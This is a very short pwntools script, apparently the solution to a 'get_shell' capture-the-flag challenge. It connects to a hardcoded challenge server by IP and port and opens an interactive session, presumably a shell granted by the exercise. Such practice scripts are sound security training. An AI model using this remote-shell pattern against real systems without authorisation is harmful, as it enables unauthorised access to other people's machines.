from pwn import *
#p = process("./get_shell")
h,p = '111.200.241.244',62257
p = remote(h,p)
p.interactive()
